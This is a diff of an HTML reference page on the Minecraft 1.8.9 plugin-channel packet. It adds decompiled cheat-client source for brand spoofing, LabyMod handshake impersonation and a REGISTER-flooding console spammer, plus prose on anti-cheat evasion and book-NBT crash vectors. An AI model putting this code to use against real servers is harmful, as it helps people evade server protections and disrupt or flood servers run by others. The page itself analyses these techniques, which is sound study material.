@@ -18,14 +18,14 @@
 <meta name="twitter:description" content="C17PacketCustomPayload (0x17): Sends a plugin channel message from client to server. Used for mod communication.">
 <meta name="twitter:label1" content="Direction"><meta name="twitter:data1" content="Serverbound">
 <meta name="twitter:label2" content="State"><meta name="twitter:data2" content="PLAY">
-<meta name="twitter:label3" content="Modules"><meta name="twitter:data3" content="BrandChanger, Disabler, ServerCrasher, LunarSpoofer">
+<meta name="twitter:label3" content="Modules"><meta name="twitter:data3" content="ClientSpoofer, LabyMod (client spoofer), ChannelConsoleSpammer, Crasher (BEdit / Mare), TestDisabler (payload rewrite)">
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📦</text></svg>">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="../../css/style.css">
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"TechArticle","headline":"C17PacketCustomPayload — Minecraft 1.8.9 Packet Reference","description":"","about":{"@type":"SoftwareApplication","name":"Minecraft Java Edition","version":"1.8.9"},"proficiencyLevel":"Expert","articleSection":"PLAY Protocol — Serverbound"}
+{"@context":"https://schema.org","@type":"TechArticle","headline":"C17PacketCustomPayload — Minecraft 1.8.9 Packet Reference","description":"The plugin-channel packet and the corpus's widest abuse surface: brand spoofing (Rise 5.99 ClientSpoofer, Rise 6.x LabyMod), payload rewriting (TestDisabler), REGISTER flooding (ChannelConsoleSpammer), book-NBT crash payloads (Rise 5.99 Crasher, Tenacity CrasherCommand) and blink-hold integration.","about":{"@type":"SoftwareApplication","name":"Minecraft Java Edition","version":"1.8.9"},"proficiencyLevel":"Expert","articleSection":"PLAY Protocol — Serverbound"}
 </script>
 </head>
 <body>
@@ -72,215 +72,361 @@
 </div></div>
 <div class="detail-section"><h3>Handler Interface</h3><div class="mcp-block"><div class="mcp-row"><span class="mcp-label">HND</span><code>INetHandlerPlayServer</code></div></div></div>
 <div class="detail-section"><h3>Notes</h3><div class="notes-box">Common vanilla channels: "MC|BEdit" (book edit), "MC|BSign" (book sign), "MC|ItemName" (anvil rename), "MC|TrSel" (trade select). Mods use their own channel names.</div></div>
+<div class="detail-section"><h3>Deep Dive</h3><div class="writeup-block">
+<h4>Role in the protocol</h4>
+<p>C17 is the plugin-channel transport: a channel String plus a short-length-prefixed byte payload. Vanilla channels cover brand (MC|Brand), books (MC|BEdit, MC|BSign), anvil rename (MC|ItemName), villager trades (MC|TrSel), command blocks (MC|AdvCdm) and channel registration (REGISTER). It is the most structurally open serverbound packet, since the server hands unknown channels to plugin handlers unchanged.</p>
+<h4>Vanilla handling</h4>
+<p>processVanilla250Packet dispatches on channel: MC|BEdit and MC|BSign deserialize an ItemStack and validate its NBT (ItemWritableBook.isNBTValid / ItemEditableBook.validBookTagContents) before applying; MC|TrSel reads an int trade index against the open merchant container; MC|AdvCdm requires command blocks enabled plus permission level 2 and creative mode; MC|ItemName renames the anvil item. Unknown channels are ignored by vanilla. The client side registers MC|Brand once per connection via ClientBrandRetriever.</p>
+<h4>Why clients touch it</h4>
+<p>Five families. (1) Brand spoofing: Rise 5.99 ClientSpoofer rewrites C17 payloads per mode, and the Rise 6.x ClientSpoofer's LabyMod mode cancels and replays six LabyMod/Intave payloads. (2) Disabler payload rewriting: Rise 6.2.4 TestDisabler overwrites every C17 payload with 'eyser'. (3) Console spam: Rise 6.x ChannelConsoleSpammer floods REGISTER. (4) Crash payloads: Rise 5.99 Crasher's BEdit and Mare modes push deeply nested book NBT over MC|BEdit; Tenacity's CrasherCommand floods a fixed C17. (5) Blink: PingSpoofComponent holds C17 in its blink tuple.</p>
+<h4>Exploit surface</h4>
+<p>The brand channel is a fingerprinting surface in both directions: servers read MC|Brand and REGISTER to identify clients, and spoofers forge them. The MC|BEdit path is the crash vector because the server deserializes a full ItemStack and validates deep NBT; the nested {extra:[{...}} page strings in Rise 5.99's BEdit mode are the same family as the C0E and C10 book crashes. REGISTER flooding abuses plugin channel registries that allocate per registration. Behavioral mismatch is the anti-cheat counter: a spoofed brand that behaves unlike the real client is itself a signal.</p>
+</div></div>
+<div class="detail-section"><h3>Server-Side Handling</h3><div class="callout callout-server"><p>processVanilla250Packet: channel dispatch with per-channel validation. MC|BEdit/MC|BSign validate book NBT and throw IOException on invalid tags; MC|AdvCdm gates on command blocks enabled, permission 2 and creative; MC|ItemName renames with a length check; MC|TrSel indexes the open ContainerMerchant. Unknown channels are ignored. The packet data is a PacketBuffer, so parsing is stateful and plugin-dependent.</p></div></div>
+<div class="detail-section"><h3>Protocol Analysis</h3><div class="callout callout-proto"><p>String channel + short data length + bytes. The REGISTER channel carries a colon-separated channel list, which is how mods announce handlers. MC|Brand is sent exactly once per connection right after login, which is why brand spoofers tell the user to rejoin. Payloads are length-prefixed shorts, so the 32KB cap applies per payload.</p></div></div>
+<div class="detail-section"><h3>Anti-Cheat Landscape</h3><div class="callout callout-ac"><p>Anti-cheats do not parse C17 content; anti-exploit plugins and client-detection plugins do. Client detection reads MC|Brand and REGISTER lists and compares against known client signatures, so spoofing is a cat-and-mouse over payload bytes. Book-NBT crash payloads are detected only by patched parsers. REGISTER flooding is rate-limited by anti-spam plugins.</p></div></div>
 <div class="impl-section"><h3><span class="impl-badge">implementation</span> Implementation Cases</h3>
-<div class="impl-module-entry"><div class="impl-module-header"><span class="impl-module-name">BrandChanger</span>
-<span class="impl-module-clients">(November 0.2 (LunarSpoofer), Gugustus (BLC spoof), Lycoris 2.0 (ServerCrasher), Sigma 3.9)</span>
+<p class="impl-pattern">The plugin-channel packet and the corpus's widest abuse surface: brand spoofing (Rise 5.99 ClientSpoofer, Rise 6.x LabyMod), payload rewriting (TestDisabler), REGISTER flooding (ChannelConsoleSpammer), book-NBT crash payloads (Rise 5.99 Crasher, Tenacity CrasherCommand) and blink-hold integration.</p>
+<div class="impl-module-entry"><div class="impl-module-header"><span class="impl-module-name">ClientSpoofer</span>
+<span class="impl-module-clients">(Rise 5.99)</span>
 </div>
-<p class="impl-pattern">Spoof client brand on "MC|Brand" channel. ServerCrasher sends crafted payloads on "MC|AdvCdm". Disabler sends fake BLC brand for Badlion Client emulation. Vanilla sends brand, beacon, trading, book, anvil channels.</p>
-<div class="impl-code-wrap collapsed"><div class="impl-code"><code>// Brand spoof
-if (event.getPacket() instanceof C17PacketCustomPayload) {
-  C17PacketCustomPayload c17 = (C17PacketCustomPayload) event.getPacket();
-  if (c17.getChannelName().equals("MC|Brand")) {
-    event.setCancelled(true);
-    mc.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload("MC|Brand", new PacketBuffer(Unpooled.buffer()).writeString("vanilla")));
-  }
-}
-// Lunar brand spoof
-mc.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload("REGISTER", new PacketBuffer(message).writeString("Lunar-Client")));</code></div><button class="code-expand-btn" onclick="var w=this.parentNode;w.classList.toggle('collapsed');w.classList.toggle('expanded');this.querySelector('.expand-label').textContent=w.classList.contains('collapsed')?'Show more':'Show less'"><svg class="expand-icon-collapsed" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg><svg class="expand-icon-expanded" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18 15 12 9 6 15"/></svg><span class="expand-label">Show more</span></button></div>
-<div class="impl-meta"><span><strong>Vanilla hook:</strong> EventSendPacket</span></div>
-</div>
-<div class="impl-module-entry"><div class="impl-module-header"><span class="impl-module-name">Disabler</span>
-<span class="impl-module-clients">(November 0.2 (LunarSpoofer), Gugustus (BLC spoof), Lycoris 2.0 (ServerCrasher), Sigma 3.9)</span>
-</div>
-<p class="impl-pattern">Spoof client brand on "MC|Brand" channel. ServerCrasher sends crafted payloads on "MC|AdvCdm". Disabler sends fake BLC brand for Badlion Client emulation. Vanilla sends brand, beacon, trading, book, anvil channels.</p>
-<div class="impl-code-wrap collapsed"><div class="impl-code"><code>/*
- * Decompiled with CFR 0.152.
- * 
- * Could not load the following classes:
- *  com.google.common.eventbus.Subscribe
- *  org.apache.commons.lang3.RandomUtils
+<p class="impl-pattern">Rewrite the C17 brand handshake so servers fingerprint the client as Forge, Lunar, LabyMod, PvP Lounge, CheatBreaker or Geyser.</p>
+<p class="impl-pattern" style="font-size:0.8rem;color:var(--text-muted)">On PacketSendEvent, mutates every C17 in place: sets a new payload (writeString or raw bytes) per mode, and for Lunar also rewrites the channel to REGISTER. Requires a rejoin because MC|Brand is sent once per connection.</p>
+<p class="impl-meta" style="font-size:0.75rem"><span><strong>Source:</strong> Rise 5.99 — dev/rise/module/impl/other/ClientSpoofer.java</span></p>
+<div class="impl-code-wrap collapsed"><div class="impl-code"><code>// ===== FILE: Rise 5.99 — dev/rise/module/impl/other/ClientSpoofer.java =====
+/*
+ Copyright Alan Wood 2021
+ None of this code to be reused without my written permission
+ Intellectual Rights owned by Alan Wood
  */
-package lodomir.dev.modules.impl.exploit;
+package dev.rise.module.impl.other;
 
-import com.google.common.eventbus.Subscribe;
-import java.util.UUID;
-import lodomir.dev.event.impl.EventGetPackets;
-import lodomir.dev.event.impl.EventUpdate;
-import lodomir.dev.modules.Category;
-import lodomir.dev.modules.Module;
-import lodomir.dev.settings.ModeSetting;
-import lodomir.dev.utils.math.TimeUtils;
-import net.minecraft.client.entity.EntityPlayerSP;
-import net.minecraft.init.Blocks;
-import net.minecraft.item.ItemStack;
-import net.minecraft.network.play.client.C00PacketKeepAlive;
-import net.minecraft.network.play.client.C02PacketUseEntity;
-import net.minecraft.network.play.client.C03PacketPlayer;
-import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
-import net.minecraft.network.play.client.C0APacketAnimation;
-import net.minecraft.network.play.client.C0BPacketEntityAction;
-import net.minecraft.network.play.client.C0CPacketInput;
-import net.minecraft.network.play.client.C0FPacketConfirmTransaction;
-import net.minecraft.network.play.client.C18PacketSpectate;
-import net.minecraft.network.play.server.S1DPacketEntityEffect;
-import net.minecraft.network.play.server.S27PacketExplosion;
-import net.minecraft.network.play.server.S2APacketParticles;
-import net.minecraft.network.play.server.S44PacketWorldBorder;
-import net.minecraft.network.status.client.C01PacketPing;
-import net.minecraft.util.BlockPos;
-import org.apache.commons.lang3.RandomUtils;
+import dev.rise.event.impl.packet.PacketSendEvent;
+import dev.rise.module.Module;
+import dev.rise.module.api.ModuleInfo;
+import dev.rise.module.enums.Category;
+import dev.rise.setting.impl.ModeSetting;
+import io.netty.buffer.Unpooled;
+import net.minecraft.network.PacketBuffer;
+import net.minecraft.network.play.client.C17PacketCustomPayload;
 
-public class Disabler
-extends Module {
-    public ModeSetting mode = new ModeSetting("Mode", "Basic", "Basic", "Keep Sprint", "Respawn", "Watchdog", "Verus Old", "Verus Combat", "Mineplex Combat", "Kauri", "Hycraft Crash", "Ping", "Test");
-    public TimeUtils timer = new TimeUtils();
-    public int currentTrans;
-    public int count;
+@ModuleInfo(name = "ClientSpoofer", description = "Makes servers think you're on the specified client", category = Category.OTHER)
+public final class ClientSpoofer extends Module {
+    private final ModeSetting mode = new ModeSetting("Mode", this, "Forge", "Forge", "Lunar", "LabyMod", "PvP Lounge", "CheatBreaker", "Geyser");
 
-    public Disabler() {
-        super("Disabler", 0, Category.EXPLOIT);
-        this.addSetting(this.mode);
-    }
-
-    @Subscribe
-    public void onUpdate(EventUpdate event) {
+    @Override
+    protected void onEnable() {
+        this.registerNotification("Rejoin for " + this.getModuleInfo().name() + " to work.");
     }
 
     @Override
-    public void onEnable() {
-        this.timer.reset();
-        super.onEnable();
-    }
-
-    @Override
-    public void onDisable() {
-        super.onDisable();
-    }
-
-    @Subscribe
-    public void onGetPackets(EventGetPackets p) {
-        this.setSuffix(this.mode.getMode());
-        switch (this.mode.getMode()) {
-            case "Basic": {
-                if (!(p.getPackets() instanceof C0FPacketConfirmTransaction) &amp;&amp; !(p.getPackets() instanceof C00PacketKeepAlive)) break;
-                p.setCancelled(true);
-                break;
-            }
-            case "Mineplex Combat": {
-                if (!(p.getPackets() instanceof C00PacketKeepAlive)) break;
-                C00PacketKeepAlive c00 = (C00PacketKeepAlive)p.getPackets();
-                p.setCancelled(true);
-                this.sendPacketSilent(new C00PacketKeepAlive(c00.getKey() - RandomUtils.nextInt((int)1000, (int)Integer.MAX_VALUE)));
-                break;
-            }
-            case "Kauri": {
-                if (!(p.getPackets() instanceof C0FPacketConfirmTransaction)) break;
-                p.setCancelled(true);
-                break;
-            }
-            case "Watchdog": {
-                if (p.getPackets() instanceof C03PacketPlayer) {
-                    p.setCancelled(true);
+    public void onPacketSend(final PacketSendEvent event) {
+        if (event.getPacket() instanceof C17PacketCustomPayload) {
+            final C17PacketCustomPayload packet = (C17PacketCustomPayload) event.getPacket();
+            switch (mode.getMode()) {
+                case "Forge": {
+                    packet.setData(createPacketBuffer("FML", true));
                     break;
                 }
-            }
-            case "Verus Old": {
-                this.sendPacketSilent(new C0CPacketInput());
-                this.sendPacketSilent(new C18PacketSpectate(UUID.randomUUID()));
-                break;
-            }
-            case "Verus Combat": {
-                if (Disabler.mc.thePlayer.ticksExisted &lt;= 20 || Disabler.mc.thePlayer.capabilities.allowFlying || !(p.getPackets() instanceof C0FPacketConfirmTransaction)) break;
-                p.setCancelled(true);
-                break;
-            }
-            case "Hycraft Crash": {
-                if (!(p.getPackets() instanceof S27PacketExplosion) || !(p.getPackets() instanceof S2APacketParticles) || !(p.getPackets() instanceof S1DPacketEntityEffect) || !(p.getPackets() instanceof S44PacketWorldBorder)) break;
-                p.setCancelled(true);
-                break;
-            }
-            case "Ping": {
-                if (p.getPackets() instanceof C01PacketPing) {
-                    p.setCancelled(true);
+
+                case "Lunar": {
+                    packet.setChannel("REGISTER");
+                    packet.setData(createPacketBuffer("Lunar-Client", false));
                     break;
                 }
-            }
-            case "Respawn": {
-                if (Disabler.mc.thePlayer.ticksExisted % 8 != 0 || Disabler.mc.thePlayer.isDead) break;
-                Disabler.mc.thePlayer.fall(20.0f, 1.0f);
-                this.sendPacket(new C08PacketPlayerBlockPlacement(new BlockPos(Disabler.mc.thePlayer.posX, Disabler.mc.thePlayer.posY + 1.5, Disabler.mc.thePlayer.posZ), 1, new ItemStack(Blocks.stone.getItem(Disabler.mc.theWorld, new BlockPos(-1, -1, -1))), 0.0f, 0.94f, 0.0f));
-                this.sendPacket(new C03PacketPlayer.C04PacketPlayerPosition(Disabler.mc.thePlayer.posX, Disabler.mc.thePlayer.posY + 20.0, Disabler.mc.thePlayer.posZ, false));
-                this.sendPacket(new C03PacketPlayer.C04PacketPlayerPosition(Disabler.mc.thePlayer.posX, Disabler.mc.thePlayer.posY, Disabler.mc.thePlayer.posZ, false));
-                this.sendPacket(new C03PacketPlayer.C04PacketPlayerPosition(Disabler.mc.thePlayer.posX, Disabler.mc.thePlayer.posY + (double)0.42f, Disabler.mc.thePlayer.posZ, true));
-                break;
-            }
-            case "Test": {
-                if (!(p.getPackets() instanceof C03PacketPlayer) || !(p.getPackets() instanceof C0FPacketConfirmTransaction)) break;
-                if (this.timer.hasReached(1000L) &amp;&amp; Disabler.mc.thePlayer.ticksExisted % 8 == 0) {
-                    if (p.getPackets() instanceof C03PacketPlayer.C04PacketPlayerPosition || p.getPackets() instanceof C03PacketPlayer.C06PacketPlayerPosLook || p.getPackets() instanceof C08PacketPlayerBlockPlacement || p.getPackets() instanceof C0APacketAnimation || p.getPackets() instanceof C0BPacketEntityAction || p.getPackets() instanceof C02PacketUseEntity) {
-                        this.sendPacketSilent(new C03PacketPlayer.C04PacketPlayerPosition(Disabler.mc.thePlayer.prevPosX, Disabler.mc.thePlayer.prevPosY, Disabler.mc.thePlayer.prevPosZ, true));
-                    }
-                    p.setCancelled(true);
+
+                case "LabyMod": {
+                    packet.setData(createPacketBuffer("LMC", true));
+                    break;
                 }
-                if (p.getPackets() instanceof C01PacketPing &amp;&amp; this.timer.hasReached(4000L)) {
-                    p.setCancelled(true);
+
+                case "PvP Lounge": {
+                    packet.setData(createPacketBuffer("PLC18", false));
+                    break;
                 }
-                this.timer.reset();
-                break;
-            }
-            case "Keep Sprint": {
-                if (!(p.getPackets() instanceof C0BPacketEntityAction)) break;
-                C0BPacketEntityAction c0B = (C0BPacketEntityAction)p.getPackets();
-                if (c0B.getAction().equals((Object)C0BPacketEntityAction.Action.START_SPRINTING)) {
-                    if (EntityPlayerSP.serverSprintState) {
-                        this.sendPacketSilent(new C0BPacketEntityAction(Disabler.mc.thePlayer, C0BPacketEntityAction.Action.STOP_SPRINTING));
-                        EntityPlayerSP.serverSprintState = false;
-                    }
-                    p.setCancelled(true);
+
+                case "CheatBreaker": {
+                    packet.setData(createPacketBuffer("CB", true));
+                    break;
                 }
-                if (!c0B.getAction().equals((Object)C0BPacketEntityAction.Action.STOP_SPRINTING)) break;
-                p.setCancelled(true);
+
+                case "Geyser": {
+                    packet.setData(createPacketBuffer("Geyser", false));
+                    break;
+                }
             }
         }
     }
-}
 
-</code></div><button class="code-expand-btn" onclick="var w=this.parentNode;w.classList.toggle('collapsed');w.classList.toggle('expanded');this.querySelector('.expand-label').textContent=w.classList.contains('collapsed')?'Show more':'Show less'"><svg class="expand-icon-collapsed" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg><svg class="expand-icon-expanded" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18 15 12 9 6 15"/></svg><span class="expand-label">Show more</span></button></div>
-<div class="impl-meta"><span><strong>Vanilla hook:</strong> EventSendPacket</span></div>
-</div>
-<div class="impl-module-entry"><div class="impl-module-header"><span class="impl-module-name">ServerCrasher</span>
-<span class="impl-module-clients">(November 0.2 (LunarSpoofer), Gugustus (BLC spoof), Lycoris 2.0 (ServerCrasher), Sigma 3.9)</span>
-</div>
-<p class="impl-pattern">Spoof client brand on "MC|Brand" channel. ServerCrasher sends crafted payloads on "MC|AdvCdm". Disabler sends fake BLC brand for Badlion Client emulation. Vanilla sends brand, beacon, trading, book, anvil channels.</p>
-<div class="impl-code-wrap collapsed"><div class="impl-code"><code>// Brand spoof
-if (event.getPacket() instanceof C17PacketCustomPayload) {
-  C17PacketCustomPayload c17 = (C17PacketCustomPayload) event.getPacket();
-  if (c17.getChannelName().equals("MC|Brand")) {
-    event.setCancelled(true);
-    mc.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload("MC|Brand", new PacketBuffer(Unpooled.buffer()).writeString("vanilla")));
-  }
+    private PacketBuffer createPacketBuffer(final String data, final boolean string) {
+        if (string)
+            return new PacketBuffer(Unpooled.buffer()).writeString(data);
+        else
+            return new PacketBuffer(Unpooled.wrappedBuffer(data.getBytes()));
+    }
 }
-// Lunar brand spoof
-mc.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload("REGISTER", new PacketBuffer(message).writeString("Lunar-Client")));</code></div><button class="code-expand-btn" onclick="var w=this.parentNode;w.classList.toggle('collapsed');w.classList.toggle('expanded');this.querySelector('.expand-label').textContent=w.classList.contains('collapsed')?'Show more':'Show less'"><svg class="expand-icon-collapsed" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg><svg class="expand-icon-expanded" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18 15 12 9 6 15"/></svg><span class="expand-label">Show more</span></button></div>
-<div class="impl-meta"><span><strong>Vanilla hook:</strong> EventSendPacket</span></div>
+// NOTE (AI): ClientSpoofer rewrites the brand handshake on PacketSendEvent. Every outgoing C17 is mutated in place per the selected mode: Forge rewrites the payload to the FML string, Lunar changes the channel to REGISTER with a Lunar-Client payload, LabyMod/PvP Lounge/CheatBreaker/Geyser rewrite the payload with their brand strings. Note the module tells the user to rejoin: the MC|Brand packet is only sent once per connection, so a mid-session rewrite affects nothing until the next login.</code></div><button class="code-expand-btn" onclick="var w=this.parentNode;w.classList.toggle('collapsed');w.classList.toggle('expanded');this.querySelector('.expand-label').textContent=w.classList.contains('collapsed')?'Show more':'Show less'"><svg class="expand-icon-collapsed" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg><svg class="expand-icon-expanded" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18 15 12 9 6 15"/></svg><span class="expand-label">Show more</span></button></div>
+<div class="impl-meta"><span><strong>Vanilla hook:</strong> onPacketSend (PacketSendEvent).</span></div>
+<div class="impl-meta" style="color:var(--orange);margin-top:4px"><span>A spoofed brand that behaves unlike the real client (missing plugin channels, wrong packets) is the detectable mismatch; pure payload rewriting is otherwise invisible.</span></div>
+<div class="impl-meta" style="margin-top:4px"><span><strong>Variations:</strong> Rise 6.x splits this into a ClientSpoofer module with per-client Modes; LabyMod is the richest of them.</span></div>
 </div>
-<div class="impl-module-entry"><div class="impl-module-header"><span class="impl-module-name">LunarSpoofer</span>
-<span class="impl-module-clients">(November 0.2 (LunarSpoofer), Gugustus (BLC spoof), Lycoris 2.0 (ServerCrasher), Sigma 3.9)</span>
+<div class="impl-module-entry"><div class="impl-module-header"><span class="impl-module-name">LabyMod (client spoofer)</span>
+<span class="impl-module-clients">(Rise 6.1.30, Rise 6.2.4)</span>
 </div>
-<p class="impl-pattern">Spoof client brand on "MC|Brand" channel. ServerCrasher sends crafted payloads on "MC|AdvCdm". Disabler sends fake BLC brand for Badlion Client emulation. Vanilla sends brand, beacon, trading, book, anvil channels.</p>
-<div class="impl-code-wrap collapsed"><div class="impl-code"><code>// Brand spoof
-if (event.getPacket() instanceof C17PacketCustomPayload) {
-  C17PacketCustomPayload c17 = (C17PacketCustomPayload) event.getPacket();
-  if (c17.getChannelName().equals("MC|Brand")) {
-    event.setCancelled(true);
-    mc.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload("MC|Brand", new PacketBuffer(Unpooled.buffer()).writeString("vanilla")));
-  }
+<p class="impl-pattern">Fully impersonate the LabyMod handshake: cancel the real C17 and replay six LabyMod and Intave channel payloads.</p>
+<p class="impl-pattern" style="font-size:0.8rem;color:var(--text-muted)">On PacketSendEvent, cancels the original C17 and sends MC|Brand 'labymod', REGISTER for labymod:neominecraft:intavelabymod3:main, version JSONs on labymod:neo and labymod3:main, and two minecraft:intave clientconfig messages, all via sendNoEvent. The spoofed version defaults to 4.2.31.</p>
+<p class="impl-meta" style="font-size:0.75rem"><span><strong>Source:</strong> Rise 6.2.4 — Client-release2/Client/src/main/java/com/alan/clients/module/impl/other/clientspoofer/LabyMod.java</span></p>
+<div class="impl-code-wrap collapsed"><div class="impl-code"><code>// ===== FILE: Rise 6.2.4 — Client-release2/Client/src/main/java/com/alan/clients/module/impl/other/clientspoofer/LabyMod.java =====
+package com.alan.clients.module.impl.other.clientspoofer;
+
+import com.alan.clients.event.Listener;
+import com.alan.clients.event.annotations.EventLink;
+import com.alan.clients.event.impl.packet.PacketSendEvent;
+import com.alan.clients.module.impl.other.ClientSpoofer;
+import com.alan.clients.util.packet.PacketUtil;
+import com.alan.clients.util.tuples.Triple;
+import com.alan.clients.value.Mode;
+import com.alan.clients.value.impl.StringValue;
+import io.netty.buffer.Unpooled;
+import net.minecraft.network.Packet;
+import net.minecraft.network.PacketBuffer;
+import net.minecraft.network.play.client.C17PacketCustomPayload;
+
+import java.util.ArrayList;
+
+public class LabyMod extends Mode&lt;ClientSpoofer&gt; {
+
+    public LabyMod(String name, ClientSpoofer parent) {
+        super(name, parent);
+    }
+
+    private final StringValue version = new StringValue("Spoofed Version, Latest would be preferred",
+            this, "4.2.31");
+
+    @EventLink
+    public final Listener&lt;PacketSendEvent&gt; onPacketSend = event -&gt; {
+        Packet&lt;?&gt; packet = event.getPacket();
+
+        if (packet instanceof C17PacketCustomPayload) {
+            ArrayList&lt;Triple&lt;String, String, Boolean&gt;&gt; payloads = new ArrayList&lt;Triple&lt;String, String, Boolean&gt;&gt;() {{
+                add(new Triple&lt;&gt;("MC|Brand", "labymod",true));
+                add(new Triple&lt;&gt;("REGISTER", "labymod:neominecraft:intavelabymod3:main",false));
+                add(new Triple&lt;&gt;("labymod:neo", "{\"version\":\"" + version.getValue() + "\"}",false));
+                add(new Triple&lt;&gt;("labymod3:main", "INFO{\"version\":\"" + version.getValue() + "\"}",false));
+                add(new Triple&lt;&gt;("minecraft:intave", "L{\"legacySneakHeight\":false,\"legacyOldRange\":false,\"legacyOldSlowdown\":false}",false));
+                add(new Triple&lt;&gt;("minecraft:intave", "\n" +
+                        "clientconfigL{\"legacySneakHeight\":false,\"legacyOldRange\":false,\"legacyOldSlowdown\":false}",false));
+            }};
+
+            event.setCancelled();
+
+            for (Triple&lt;String, String, Boolean&gt; payload : payloads) {
+                PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
+
+                if (payload.getThird()) {
+                    packetbuffer.writeString(payload.getSecond());
+                } else {
+                    packetbuffer.writeBytes(payload.getSecond().getBytes());
+                }
+
+                C17PacketCustomPayload newPayload = new C17PacketCustomPayload(payload.getFirst(), packetbuffer);
+
+                PacketUtil.sendNoEvent(newPayload);
+            }
+        }
+    };
 }
-// Lunar brand spoof
-mc.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload("REGISTER", new PacketBuffer(message).writeString("Lunar-Client")));</code></div><button class="code-expand-btn" onclick="var w=this.parentNode;w.classList.toggle('collapsed');w.classList.toggle('expanded');this.querySelector('.expand-label').textContent=w.classList.contains('collapsed')?'Show more':'Show less'"><svg class="expand-icon-collapsed" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg><svg class="expand-icon-expanded" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18 15 12 9 6 15"/></svg><span class="expand-label">Show more</span></button></div>
-<div class="impl-meta"><span><strong>Vanilla hook:</strong> EventSendPacket</span></div>
+// NOTE (AI): LabyMod is a Mode of the Rise 6.x ClientSpoofer. On every C17 it cancels the original packet and replays six spoofed payloads via sendNoEvent: MC|Brand 'labymod', a REGISTER for the labymod channels, labymod:neo and labymod3:main version JSONs, and two minecraft:intave clientconfig messages. The version string is user-configurable and defaults to 4.2.31.</code></div><button class="code-expand-btn" onclick="var w=this.parentNode;w.classList.toggle('collapsed');w.classList.toggle('expanded');this.querySelector('.expand-label').textContent=w.classList.contains('collapsed')?'Show more':'Show less'"><svg class="expand-icon-collapsed" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg><svg class="expand-icon-expanded" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18 15 12 9 6 15"/></svg><span class="expand-label">Show more</span></button></div>
+<div class="impl-meta"><span><strong>Vanilla hook:</strong> PacketSendEvent.</span></div>
+<div class="impl-meta" style="color:var(--orange);margin-top:4px"><span>The Intave config payloads advertise legacySneakHeight/legacyOldRange/legacyOldSlowdown false, which Intave-based servers read to enable stricter checks; mis-spoofing them can backfire.</span></div>
+<div class="impl-meta" style="margin-top:4px"><span><strong>Variations:</strong> Identical Mode in Rise 6.1.30.</span></div>
 </div>
+<div class="impl-module-entry"><div class="impl-module-header"><span class="impl-module-name">ChannelConsoleSpammer</span>
+<span class="impl-module-clients">(Rise 6.1.30, Rise 6.2.4)</span>
 </div>
+<p class="impl-pattern">Flood the server with REGISTER payloads naming random MC| channels.</p>
+<p class="impl-pattern" style="font-size:0.8rem;color:var(--text-muted)">On TickEvent, sends channelsPerTick (1..100) REGISTER packets, each with a random 8-16 letter channel name, via PacketUtil.send.</p>
+<p class="impl-meta" style="font-size:0.75rem"><span><strong>Source:</strong> Rise 6.2.4 — Client-release2/Client/src/main/java/com/alan/clients/module/impl/exploit/consolespammer/ChannelConsoleSpammer.java</span></p>
+<div class="impl-code-wrap collapsed"><div class="impl-code"><code>// ===== FILE: Rise 6.2.4 — Client-release2/Client/src/main/java/com/alan/clients/module/impl/exploit/consolespammer/ChannelConsoleSpammer.java =====
+package com.alan.clients.module.impl.exploit.consolespammer;
+
+import com.alan.clients.event.Listener;
+import com.alan.clients.event.annotations.EventLink;
+import com.alan.clients.event.impl.other.TickEvent;
+import com.alan.clients.module.impl.exploit.ConsoleSpammer;
+import com.alan.clients.util.packet.PacketUtil;
+import com.alan.clients.value.Mode;
+import com.alan.clients.value.impl.NumberValue;
+import io.netty.buffer.Unpooled;
+import net.minecraft.network.PacketBuffer;
+import net.minecraft.network.play.client.C17PacketCustomPayload;
+import org.apache.commons.lang3.RandomStringUtils;
+
+public class ChannelConsoleSpammer extends Mode&lt;ConsoleSpammer&gt; {
+
+    private final NumberValue channelsPerTick = new NumberValue("Channels/tick", this, 1, 1, 100, 1);
+
+    public ChannelConsoleSpammer(String name, ConsoleSpammer parent) {
+        super(name, parent);
+    }
+
+    @EventLink
+    public final Listener&lt;TickEvent&gt; onTick = event -&gt; {
+        for (int i = 0; i &lt; channelsPerTick.getValue().intValue(); ++i) {
+            final PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
+            buffer.writeString("MC|" + RandomStringUtils.randomAlphabetic(8, 16));
+
+            PacketUtil.send(new C17PacketCustomPayload("REGISTER", buffer));
+        }
+    };
+}
